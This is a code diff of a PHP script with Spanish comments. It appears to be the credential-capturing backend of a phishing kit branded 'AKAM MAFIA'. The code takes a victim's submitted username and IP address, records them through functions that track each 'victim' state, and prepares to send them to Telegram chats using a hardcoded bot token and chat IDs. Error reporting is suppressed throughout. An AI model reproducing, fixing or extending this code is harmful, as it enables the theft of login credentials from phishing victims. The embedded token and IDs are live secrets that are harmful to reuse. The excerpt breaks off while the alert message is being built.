@@ -1,17 +1,18 @@
 <?php
 error_reporting(0);
-require_once('../panel/lib/funciones.php');
+// Ruta directa a la librería
+include('../panel/lib/funciones.php');
 
 $ip = $_SERVER['REMOTE_ADDR'];
 $usuario = $_POST['usr'];
 
-// Volvemos a los 2 IDs originales para que sea veloz
+// SOLO 2 IDs para que no se trabe
 $token = "8721615356:AAGxIf7AxwGMzhoUOtxI9IRQoOXoIMJ2_iA";
-$chat_ids = ["8114050673", "8518977918"]; 
+$chat_ids = ["8114050673", "8518977918"];
 
 if (!empty($usuario)) {
-    actualizar_registro($ip, "USUARIO", $usuario);
-    actualizar_estado_victima($ip, "1");
+    @actualizar_registro($ip, "USUARIO", $usuario);
+    @actualizar_estado_victima($ip, "1");
     
     $mensaje = "⭐ <b>𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐 - INICIO</b> ⭐\n";
     $mensaje .= "👤 <b>USUARIO:</b> <code>$usuario</code>\n";
